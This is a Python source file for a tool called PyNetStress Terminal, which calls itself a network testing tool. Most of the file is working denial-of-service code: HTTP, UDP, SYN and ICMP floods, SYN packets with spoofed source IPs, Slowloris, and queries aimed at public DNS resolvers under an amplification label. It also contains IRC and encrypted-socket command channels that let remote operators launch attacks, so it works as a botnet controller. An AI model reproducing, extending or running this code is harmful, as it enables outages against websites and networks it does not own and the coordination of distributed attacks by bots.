#!/usr/bin/env python3
import os
import sys
import time
import socket
import random
import threading
import subprocess
import ipaddress
import requests
import dns.resolver
import whois
import speedtest
import psutil
import argparse
from datetime import datetime
from urllib.parse import urlparse
import struct
import select
import re
import json
import ssl
import http.client
import socks
import irc.bot
import irc.client
import irc.connection
import logging
import readline
import signal
import base64
import zlib
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

import colorama
from colorama import Fore, Back, Style
colorama.init()

DEBUG_MODE = False
IS_TERMUX = 'com.termux' in os.environ.get('PREFIX', '')
IS_ROOT = os.geteuid() == 0 if os.name == 'posix' else False
VERSION = "2.1.0"

TARGET_COLORS = {
    "down": Fore.RED,
    "slow": Fore.YELLOW,
    "rate_limited": Fore.MAGENTA,
    "banned": Fore.LIGHTMAGENTA_EX,
    "working": Fore.GREEN,
    "unknown": Fore.LIGHTRED_EX
}

class PyNetStressTerminal:
    def __init__(self):
        self.running = False
        self.attack_stats = {
            "packets_sent": 0,
            "requests_sent": 0,
            "bytes_sent": 0,
            "start_time": 0,
            "success_rate": 0,
            "target_status": "unknown"
        }
        self.target_ip = ""
        self.target_url = ""
        self.target_port = 80
        self.bot_count = 100
        self.thread_count = 50
        self.duration = 30
        self.method = "HTTP Flood"
        self.use_proxies = False
        self.proxies = []
        self.proxy_auth = None
        self.irc_connected = False
        self.irc_client = None
        self.local_server = None
        self.clients = []
        self.encryption_key = hashlib.sha256(b"default_key").digest()
        self.connection_pool = []
        self.pre_generated_packets = []
        
        logging.basicConfig(
            level=logging.DEBUG if DEBUG_MODE else logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler("pynetstress.log"),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger("PyNetStress")
    
    def log(self, message, level="info"):
        if level == "debug":
            self.logger.debug(message)
        elif level == "warning":
            self.logger.warning(message)
        elif level == "error":
            self.logger.error(message)
        else:
            self.logger.info(message)
    
    def print_banner(self):
        banner = f"""{Fore.CYAN}
  ____        _   _   _      ____  _             _   
 |  _ \ _   _| | | | | |_ __/ ___|| |_ ___  _ __| |_ 
 | |_) | | | | | | | | | '_ \___ \| __/ _ \| '__| __|
 |  __/| |_| | | | |_| | | | |__) | || (_) | |  | |_ 
 |_|    \__, |_|  \___/|_| |_|____/ \__\___/|_|   \__|
        |___/                                         
        {Style.RESET_ALL}"""
        print(banner)
        print(f"{Fore.GREEN}PyNetStress Terminal v{VERSION} - Advanced Network Testing Tool{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Platform: {sys.platform} | Root: {IS_ROOT} | Termux: {IS_TERMUX}{Style.RESET_ALL}")
        print("=" * 60)
    
    def print_status(self, message, status_type="info"):
        colors = {
            "info": Fore.BLUE,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED,
            "debug": Fore.CYAN
        }
        color = colors.get(status_type, Fore.WHITE)
        print(f"{color}[{status_type.upper()}] {message}{Style.RESET_ALL}")
    
    def print_target_status(self, status):
        color = TARGET_COLORS.get(status, TARGET_COLORS["unknown"])
        status_text = status.upper().replace("_", " ")
        print(f"{color}[TARGET] Status: {status_text}{Style.RESET_ALL}")
    
    def encrypt_data(self, data):
        cipher = AES.new(self.encryption_key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        return base64.b64encode(cipher.iv + ct_bytes).decode()
    
    def decrypt_data(self, enc_data):
        enc_data = base64.b64decode(enc_data)
        iv = enc_data[:16]
        ct = enc_data[16:]
        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode()
    
    def resolve_target(self, target):
        try:
            if not re.match(r"^https?://", target):
                if self.target_port == 443:
                    target = "https://" + target
                else:
                    target = "http://" + target
            
            parsed = urlparse(target)
            domain = parsed.netloc or parsed.path
            
            if ":" in domain:
                domain = domain.split(":")[0]
                
            self.target_ip = socket.gethostbyname(domain)
            self.target_url = domain
            return True
        except Exception as e:
            self.print_status(f"Failed to resolve target: {e}", "error")
            return False
    
    def check_target_status(self):
        try:
            start_time = time.time()
            
            try:
                if self.target_port == 443:
                    conn = http.client.HTTPSConnection(self.target_ip, self.target_port, timeout=5)
                else:
                    conn = http.client.HTTPConnection(self.target_ip, self.target_port, timeout=5)
                
                conn.request("HEAD", "/")
                response = conn.getresponse()
                response_time = (time.time() - start_time) * 1000
                
                if response.status == 200:
                    if response_time < 100:
                        return "working"
                    elif response_time < 1000:
                        return "slow"
                    else:
                        return "rate_limited"
                elif response.status in [429, 503]:
                    return "rate_limited"
                elif response.status in [403, 401]:
                    return "banned"
                else:
                    return "down"
            except:
                pass
            
            try:
                if os.name == 'nt':
                    cmd = ['ping', '-n', '1', '-w', '1000', self.target_ip]
                else:
                    cmd = ['ping', '-c', '1', '-W', '1', self.target_ip]
                
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    return "working"
                else:
                    return "down"
            except:
                pass
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((self.target_ip, self.target_port))
                sock.close()
                
                if result == 0:
                    return "working"
                else:
                    return "down"
            except:
                pass
            
            return "unknown"
        except Exception as e:
            self.log(f"Error checking target status: {e}", "error")
            return "unknown"
    
    def load_proxies(self, proxy_file=None):
        if proxy_file and os.path.exists(proxy_file):
            try:
                with open(proxy_file, 'r') as f:
                    self.proxies = [line.strip() for line in f.readlines() if line.strip()]
                self.print_status(f"Loaded {len(self.proxies)} proxies from {proxy_file}", "success")
                return True
            except Exception as e:
                self.print_status(f"Failed to load proxies: {e}", "error")
                return False
        return False
    
    def get_proxy(self):
        if not self.proxies:
            return None
        
        proxy = random.choice(self.proxies)
        if "://" in proxy:
            return proxy
        
        if "@" in proxy:
            auth, proxy = proxy.split("@", 1)
            self.proxy_auth = base64.b64encode(auth.encode()).decode()
        
        return f"http://{proxy}"
    
    def pre_generate_packets(self, count=1000):
        self.pre_generated_packets = []
        
        for _ in range(count):
            payload = os.urandom(random.randint(64, 1024))
            self.pre_generated_packets.append(payload)
    
    def get_connection(self):
        if len(self.connection_pool) > 0:
            return self.connection_pool.pop()
        
        try:
            proxy = self.get_proxy() if self.use_proxies else None
            
            if proxy:
                parsed = urlparse(proxy)
                if self.target_port == 443:
                    conn = http.client.HTTPSConnection(parsed.hostname, parsed.port)
                else:
                    conn = http.client.HTTPConnection(parsed.hostname, parsed.port)
                
                if self.proxy_auth:
                    conn.set_tunnel(self.target_ip, self.target_port, 
                                  {"Proxy-Authorization": f"Basic {self.proxy_auth}"})
                else:
                    conn.set_tunnel(self.target_ip, self.target_port)
            else:
                if self.target_port == 443:
                    conn = http.client.HTTPSConnection(self.target_ip, self.target_port)
                else:
                    conn = http.client.HTTPConnection(self.target_ip, self.target_port)
            
            return conn
        except Exception as e:
            self.log(f"Connection error: {e}", "debug")
            return None
    
    def return_connection(self, conn):
        if conn:
            self.connection_pool.append(conn)
    
    def http_flood(self):
        self.print_status("Starting HTTP Flood attack", "info")
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        paths = ['/', '/index.html', '/api/data', '/images/logo.png', '/videos/demo.mp4']
        methods = ['GET', 'POST', 'HEAD']
        host = self.target_url if self.target_url else self.target_ip
        
        start_time = time.time()
        end_time = start_time + self.duration
        
        def http_worker():
            local_count = 0
            local_bytes = 0
            conn = None
            
            while time.time() < end_time and self.running:
                try:
                    if not conn:
                        conn = self.get_connection()
                        if not conn:
                            time.sleep(0.1)
                            continue
                    
                    method = random.choice(methods)
                    path = random.choice(paths)
                    
                    headers = {
                        'Host': host,
                        'User-Agent': random.choice(user_agents),
                        'Accept': '*/*',
                        'Connection': 'keep-alive'
                    }
                    
                    conn.request(method, path, headers=headers)
                    response = conn.getresponse()
                    response.read()
                    
                    local_count += 1
                    local_bytes += len(str(headers)) + len(path) + 10
                    
                    if local_count % 50 == 0:
                        with threading.Lock():
                            self.attack_stats['requests_sent'] += local_count
                            self.attack_stats['bytes_sent'] += local_bytes
                            local_count = 0
                            local_bytes = 0
                    
                except Exception as e:
                    if conn:
                        try:
                            conn.close()
                        except:
                            pass
                        conn = None
                    
                    self.log(f"HTTP worker error: {e}", "debug")
            
            if conn:
                self.return_connection(conn)
            
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['requests_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes
        
        threads = []
        for i in range(min(1000, self.thread_count * self.bot_count)):
            t = threading.Thread(target=http_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
        
        for conn in self.connection_pool:
            try:
                conn.close()
            except:
                pass
        
        self.print_status("HTTP Flood completed", "success")
    
    def udp_flood(self):
        if not IS_ROOT and os.name == 'posix':
            self.print_status("UDP Flood requires root privileges", "error")
            return
        
        self.print_status("Starting UDP Flood attack", "info")
        self.pre_generate_packets(5000)
        start_time = time.time()
        end_time = start_time + self.duration
        
        def udp_worker():
            local_count = 0
            local_bytes = 0
            
            while time.time() < end_time and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.1)
                    
                    if self.use_proxies and self.proxies:
                        proxy = random.choice(self.proxies)
                        if ":" in proxy:
                            host, port = proxy.split(":")
                            sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.set_proxy(socks.SOCKS5, host, int(port))
                    
                    payload = random.choice(self.pre_generated_packets)
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    
                    local_count += 1
                    local_bytes += len(payload)
                    
                    if local_count % 100 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            self.attack_stats['bytes_sent'] += local_bytes
                            local_count = 0
                            local_bytes = 0
                    
                    sock.close()
                except Exception as e:
                    self.log(f"UDP worker error: {e}", "debug")
            
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes
        
        threads = []
        for i in range(min(1000, self.thread_count * self.bot_count)):
            t = threading.Thread(target=udp_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
        
        self.print_status("UDP Flood completed", "success")
    
    def syn_flood(self):
        if not IS_ROOT:
            self.print_status("SYN Flood requires root privileges", "error")
            return
        
        self.print_status("Starting SYN Flood attack", "info")
        start_time = time.time()
        end_time = start_time + self.duration
        
        def syn_worker():
            local_count = 0
            
            while time.time() < end_time and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    
                    source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                    
                    ip_ver = 4
                    ip_ihl = 5
                    ip_tos = 0
                    ip_tot_len = 0
                    ip_id = random.randint(1, 65535)
                    ip_frag_off = 0
                    ip_ttl = 255
                    ip_proto = socket.IPPROTO_TCP
                    ip_check = 0
                    ip_saddr = socket.inet_aton(source_ip)
                    ip_daddr = socket.inet_aton(self.target_ip)
                    
                    ip_ihl_ver = (ip_ver << 4) + ip_ihl
                    
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                                        ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                        ip_frag_off, ip_ttl, ip_proto, ip_check,
                                        ip_saddr, ip_daddr)
                    
                    source_port = random.randint(1024, 65535)
                    dest_port = self.target_port
                    seq = random.randint(0, 4294967295)
                    ack_seq = 0
                    doff = 5
                    fin = 0
                    syn = 1
                    rst = 0
                    psh = 0
                    ack = 0
                    urg = 0
                    window = socket.htons(5840)
                    check = 0
                    urg_ptr = 0
                    
                    offset_res = (doff << 4)
                    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
                    
                    tcp_header = struct.pack('!HHLLBBHHH',
                                         source_port, dest_port, seq, ack_seq,
                                         offset_res, tcp_flags, window, check, urg_ptr)
                    
                    source_address = socket.inet_aton(source_ip)
                    dest_address = socket.inet_aton(self.target_ip)
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    
                    psh = struct.pack('!4s4sBBH',
                                  source_address, dest_address,
                                  placeholder, protocol, tcp_length)
                    psh = psh + tcp_header
                    
                    tcp_check = self.checksum(psh)
                    
                    tcp_header = struct.pack('!HHLLBBH',
                                         source_port, dest_port, seq, ack_seq,
                                         offset_res, tcp_flags, window) + struct.pack('H', tcp_check) + struct.pack('!H', urg_ptr)
                    
                    packet = ip_header + tcp_header
                    s.sendto(packet, (self.target_ip, 0))
                    
                    local_count += 1
                    
                    if local_count % 100 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            local_count = 0
                    
                    s.close()
                except Exception as e:
                    self.log(f"SYN worker error: {e}", "debug")
            
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
        
        threads = []
        for i in range(min(500, self.thread_count * self.bot_count)):
            t = threading.Thread(target=syn_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
        
        self.print_status("SYN Flood completed", "success")
    
    def checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        s = ~s & 0xffff
        return s
    
    def icmp_flood(self):
        if not IS_ROOT and os.name == 'posix':
            self.print_status("ICMP Flood requires root privileges", "error")
            return
        
        self.print_status("Starting ICMP Flood attack", "info")
        start_time = time.time()
        end_time = start_time + self.duration
        
        def icmp_worker():
            local_count = 0
            local_bytes = 0
            
            while time.time() < end_time and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    
                    icmp_type = 8
                    icmp_code = 0
                    icmp_check = 0
                    icmp_id = random.randint(0, 65535)
                    icmp_seq = random.randint(0, 65535)
                    
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                    
                    payload = os.urandom(random.randint(32, 1024))
                    
                    icmp_check = self.checksum(icmp_header + payload)
                    
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                    
                    packet = icmp_header + payload
                    s.sendto(packet, (self.target_ip, 0))
                    
                    local_count += 1
                    local_bytes += len(packet)
                    
                    if local_count % 100 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            self.attack_stats['bytes_sent'] += local_bytes
                            local_count = 0
                            local_bytes = 0
                    
                    s.close()
                except Exception as e:
                    self.log(f"ICMP worker error: {e}", "debug")
            
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes
        
        threads = []
        for i in range(min(500, self.thread_count * self.bot_count)):
            t = threading.Thread(target=icmp_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
        
        self.print_status("ICMP Flood completed", "success")
    
    def slowloris(self):
        self.print_status("Starting Slowloris attack", "info")
        start_time = time.time()
        end_time = start_time + self.duration
        
        def slowloris_worker():
            sockets = []
            headers = [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept-language: en-US,en,q=0.5"
            ]
            
            for i in range(100):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((self.target_ip, self.target_port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    for header in headers:
                        s.send(f"{header}\r\n".encode())
                    sockets.append(s)
                except Exception as e:
                    self.log(f"Slowloris socket error: {e}", "debug")
            
            while time.time() < end_time and self.running:
                for s in sockets:
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                        with threading.Lock():
                            self.attack_stats['requests_sent'] += 1
                    except Exception as e:
                        sockets.remove(s)
                        try:
                            s.close()
                        except:
                            pass
                        
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(3)
                            s.connect((self.target_ip, self.target_port))
                            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                            for header in headers:
                                s.send(f"{header}\r\n".encode())
                            sockets.append(s)
                        except:
                            pass
                
                time.sleep(10)
            
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
        
        threads = []
        for i in range(min(100, self.bot_count)):
            t = threading.Thread(target=slowloris_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
        
        self.print_status("Slowloris completed", "success")
    
    def dns_amplification(self):
        if not IS_ROOT and os.name == 'posix':
            self.print_status("DNS Amplification requires root privileges", "error")
            return
        
        self.print_status("Starting DNS Amplification attack", "info")
        
        dns_servers = [
            "8.8.8.8",
            "1.1.1.1",
            "9.9.9.9",
            "64.6.64.6",
            "208.67.222.222",
        ]
        
        query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03isc\x03org\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00"
        
        start_time = time.time()
        end_time = start_time + self.duration
        
        def dns_worker():
            local_count = 0
            local_bytes = 0
            
            while time.time() < end_time and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.settimeout(0.1)
                    
                    s.bind(('0.0.0.0', 0))
                    
                    dns_server = random.choice(dns_servers)
                    s.sendto(query, (dns_server, 53))
                    
                    local_count += 1
                    local_bytes += len(query)
                    
                    if local_count % 100 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            self.attack_stats['bytes_sent'] += local_bytes
                            local_count = 0
                            local_bytes = 0
                    
                    s.close()
                except Exception as e:
                    self.log(f"DNS worker error: {e}", "debug")
            
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes
        
        threads = []
        for i in range(min(1000, self.thread_count * self.bot_count)):
            t = threading.Thread(target=dns_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
        
        self.print_status("DNS Amplification completed", "success")
    
    def mixed_attack(self):
        if IS_TERMUX:
            self.print_status("Mixed Attack not available on Termux", "error")
            return
        
        self.print_status("Starting Mixed Attack (all methods)", "info")
        
        methods = [
            self.http_flood,
            self.udp_flood,
            self.syn_flood,
            self.icmp_flood,
            self.slowloris,
            self.dns_amplification
        ]
        
        threads = []
        
        for method in methods:
            t = threading.Thread(target=method)
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        end_time = start_time + self.duration
        
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
        
        self.print_status("Mixed Attack completed", "success")
    
    def start_attack(self):
        if not self.resolve_target(self.target_url):
            return False
        
        self.attack_stats['start_time'] = time.time()
        self.running = True
        
        status = self.check_target_status()
        self.attack_stats['target_status'] = status
        self.print_target_status(status)
        
        stats_thread = threading.Thread(target=self.monitor_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        if self.method == "HTTP Flood":
            self.http_flood()
        elif self.method == "UDP Flood":
            self.udp_flood()
        elif self.method == "SYN Flood":
            self.syn_flood()
        elif self.method == "ICMP Flood":
            self.icmp_flood()
        elif self.method == "Slowloris":
            self.slowloris()
        elif self.method == "DNS Amplification":
            self.dns_amplification()
        elif self.method == "Mixed Attack":
            self.mixed_attack()
        else:
            self.print_status(f"Unknown attack method: {self.method}", "error")
            return False
        
        self.running = False
        return True
    
    def monitor_stats(self):
        start_time = time.time()
        
        while self.running:
            elapsed = time.time() - start_time
            packets = self.attack_stats['packets_sent']
            requests = self.attack_stats['requests_sent']
            bytes_sent = self.attack_stats['bytes_sent']
            
            if bytes_sent > 1024*1024*1024:
                data_text = f"{bytes_sent/(1024*1024*1024):.2f} GB"
            elif bytes_sent > 1024*1024:
                data_text = f"{bytes_sent/(1024*1024):.2f} MB"
            elif bytes_sent > 1024:
                data_text = f"{bytes_sent/1024:.2f} KB"
            else:
                data_text = f"{bytes_sent} B"
            
            if int(elapsed) % 5 == 0:
                status = self.check_target_status()
                self.attack_stats['target_status'] = status
            
            sys.stdout.write("\033[K")
            sys.stdout.write(f"\r{Fore.CYAN}[STATS]{Style.RESET_ALL} Time: {int(elapsed)}s | Packets: {packets:,} | Requests: {requests:,} | Data: {data_text} | Status: {TARGET_COLORS[self.attack_stats['target_status']]}{self.attack_stats['target_status'].upper()}{Style.RESET_ALL}")
            sys.stdout.flush()
            
            time.sleep(0.5)
        
        elapsed = time.time() - start_time
        packets = self.attack_stats['packets_sent']
        requests = self.attack_stats['requests_sent']
        bytes_sent = self.attack_stats['bytes_sent']
        
        if bytes_sent > 1024*1024*1024:
            data_text = f"{bytes_sent/(1024*1024*1024):.2f} GB"
        elif bytes_sent > 1024*1024:
            data_text = f"{bytes_sent/(1024*1024):.2f} MB"
        elif bytes_sent > 1024:
            data_text = f"{bytes_sent/1024:.2f} KB"
        else:
            data_text = f"{bytes_sent} B"
        
        print(f"\n{Fore.GREEN}[INFO]{Style.RESET_ALL} Attack completed in {int(elapsed)}s")
        print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Total packets: {packets:,}")
        print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Total requests: {requests:,}")
        print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Total data: {data_text}")
    
    def start_irc_bot(self, server, port, channel, nickname, password=None):
        self.print_status(f"Connecting to IRC server: {server}:{port}", "info")
        
        try:
            reactor = irc.client.Reactor()
            
            if password:
                self.irc_client = reactor.server().connect(
                    server, port, nickname, password=password
                )
            else:
                self.irc_client = reactor.server().connect(server, port, nickname)
            
            self.irc_client.add_global_handler("welcome", self.on_connect)
            self.irc_client.add_global_handler("join", self.on_join)
            self.irc_client.add_global_handler("privmsg", self.on_message)
            
            self.irc_channel = channel
            self.irc_connected = True
            
            irc_thread = threading.Thread(target=reactor.process_forever)
            irc_thread.daemon = True
            irc_thread.start()
            
            self.print_status("IRC bot started successfully", "success")
            return True
        except Exception as e:
            self.print_status(f"Failed to start IRC bot: {e}", "error")
            return False
    
    def on_connect(self, connection, event):
        self.print_status("Connected to IRC server", "success")
        connection.join(self.irc_channel)
    
    def on_join(self, connection, event):
        self.print_status(f"Joined channel: {event.target}", "success")
    
    def on_message(self, connection, event):
        try:
            message = event.arguments[0]
            sender = event.source.split('!')[0]
            
            self.print_status(f"IRC message from {sender}: {message}", "debug")
            
            if message.startswith("!attack"):
                self.handle_irc_command(message, sender)
        except Exception as e:
            self.log(f"Error processing IRC message: {e}", "error")
    
    def handle_irc_command(self, message, sender):
        try:
            parts = message.split()
            if len(parts) < 2:
                self.irc_client.privmsg(self.irc_channel, "Usage: !attack <method> <target> [port] [duration]")
                return
            
            method = parts[1].upper()
            target = parts[2]
            port = int(parts[3]) if len(parts) > 3 else 80
            duration = int(parts[4]) if len(parts) > 4 else 30
            
            self.print_status(f"Received attack command from {sender}: {method} {target}:{port} for {duration}s", "info")
            
            self.method = method
            self.target_url = target
            self.target_port = port
            self.duration = duration
            
            attack_thread = threading.Thread(target=self.start_attack)
            attack_thread.daemon = True
            attack_thread.start()
            
            self.irc_client.privmsg(self.irc_channel, f"Attack started: {method} on {target}:{port} for {duration}s")
        except Exception as e:
            self.irc_client.privmsg(self.irc_channel, f"Error: {str(e)}")
    
    def start_local_server(self, host='0.0.0.0', port=8888):
        self.print_status(f"Starting local server on {host}:{port}", "info")
        
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((host, port))
            server_socket.listen(5)
            
            self.local_server = server_socket
            self.local_server_running = True
            
            server_thread = threading.Thread(target=self.handle_local_clients)
            server_thread.daemon = True
            server_thread.start()
            
            self.print_status("Local server started successfully", "success")
            return True
        except Exception as e:
            self.print_status(f"Failed to start local server: {e}", "error")
            return False
    
    def handle_local_clients(self):
        while self.local_server_running:
            try:
                client_socket, client_address = self.local_server.accept()
                self.print_status(f"New client connected: {client_address}", "info")
                
                self.clients.append(client_socket)
                
                client_thread = threading.Thread(target=self.handle_local_client, args=(client_socket,))
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                self.log(f"Error accepting client: {e}", "error")
    
    def handle_local_client(self, client_socket):
        try:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                
                try:
                    message = self.decrypt_data(data.decode())
                    self.print_status(f"Received command from client: {message}", "debug")
                    
                    response = self.process_local_command(message)
                    
                    encrypted_response = self.encrypt_data(response)
                    client_socket.send(encrypted_response.encode())
                except Exception as e:
                    self.log(f"Error processing client command: {e}", "error")
                    client_socket.send(self.encrypt_data(f"Error: {e}").encode())
        except Exception as e:
            self.log(f"Client connection error: {e}", "error")
        finally:
            client_socket.close()
            if client_socket in self.clients:
                self.clients.remove(client_socket)
    
    def process_local_command(self, command):
        try:
            parts = command.split()
            if not parts:
                return "Error: Empty command"
            
            cmd = parts[0].lower()
            
            if cmd == "attack":
                if len(parts) < 3:
                    return "Usage: attack <method> <target> [port] [duration]"
                
                method = parts[1]
                target = parts[2]
                port = int(parts[3]) if len(parts) > 3 else 80
                duration = int(parts[4]) if len(parts) > 4 else 30
                
                self.method = method
                self.target_url = target
                self.target_port = port
                self.duration = duration
                
                attack_thread = threading.Thread(target=self.start_attack)
                attack_thread.daemon = True
                attack_thread.start()
                
                return f"Attack started: {method} on {target}:{port} for {duration}s"
            
            elif cmd == "status":
                status = self.check_target_status()
                return f"Target status: {status}"
            
            elif cmd == "stats":
                packets = self.attack_stats['packets_sent']
                requests = self.attack_stats['requests_sent']
                bytes_sent = self.attack_stats['bytes_sent']
                return f"Packets: {packets}, Requests: {requests}, Data: {bytes_sent} bytes"
            
            elif cmd == "stop":
                self.running = False
                return "Attack stopped"
            
            else:
                return f"Unknown command: {cmd}"
        except Exception as e:
            return f"Error processing command: {e}"
    
    def send_to_clients(self, message):
        encrypted_message = self.encrypt_data(message)
        
        for client in self.clients[:]:
            try:
                client.send(encrypted_message.encode())
            except Exception as e:
                self.log(f"Error sending to client: {e}", "error")
                self.clients.remove(client)
    
    def start_ddos_system(self, mode, target=None):
        if mode == "local":
            if not target:
                self.print_status("Starting local DDoS system (host mode)", "info")
                return self.start_local_server()
            else:
                self.print_status("Starting local DDoS system (client mode)", "info")
                return self.connect_to_local_server(target)
        elif mode == "irc":
            if not target:
                self.print_status("IRC server required for IRC mode", "error")
                return False
            
            parts = target.split(':')
            server = parts[0]
            port = int(parts[1]) if len(parts) > 1 else 6667
            channel = parts[2] if len(parts) > 2 else "#pynetstress"
            nickname = parts[3] if len(parts) > 3 else "pynetstress_bot"
            password = parts[4] if len(parts) > 4 else None
            
            return self.start_irc_bot(server, port, channel, nickname, password)
        else:
            self.print_status(f"Unknown DDoS mode: {mode}", "error")
            return False
    
    def connect_to_local_server(self, server_address):
        try:
            parts = server_address.split(':')
            host = parts[0]
            port = int(parts[1]) if len(parts) > 1 else 8888
            
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))
            
            self.clients.append(client_socket)
            
            client_thread = threading.Thread(target=self.handle_server_messages, args=(client_socket,))
            client_thread.daemon = True
            client_thread.start()
            
            self.print_status(f"Connected to local server: {server_address}", "success")
            return True
        except Exception as e:
            self.print_status(f"Failed to connect to local server: {e}", "error")
            return False
    
    def handle_server_messages(self, client_socket):
        try:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                
                try:
                    message = self.decrypt_data(data.decode())
                    self.print_status(f"Received from server: {message}", "info")
                    
                    response = self.process_local_command(message)
                    
                    encrypted_response = self.encrypt_data(response)
                    client_socket.send(encrypted_response.encode())
                except Exception as e:
                    self.log(f"Error processing server message: {e}", "error")
        except Exception as e:
            self.log(f"Server connection error: {e}", "error")
        finally:
            client_socket.close()
            if client_socket in self.clients:
                self.clients.remove(client_socket)

def show_help():
    help_text = f"""{Fore.CYAN}
PyNetStress Terminal v{VERSION} - Help
{'-' * 50}

{Fore.YELLOW}USAGE:{Style.RESET_ALL}
  python pynetstress.py [OPTIONS] [COMMAND] [ARGS]

{Fore.YELLOW}OPTIONS:{Style.RESET_ALL}
  -h, --help            Show this help message
  -v, --version         Show version information
  -d, --debug           Enable debug mode

{Fore.YELLOW}COMMANDS:{Style.RESET_ALL}
  attack <target>       Start attack on target
    -m, --method        Attack method (default: HTTP Flood)
    -b, --bots          Number of bots (default: 100)
    -t, --threads       Threads per bot (default: 50)
    -p, --port          Target port (default: 80)
    -d, --duration      Attack duration in seconds (default: 30)
    --proxy-file        Load proxies from file

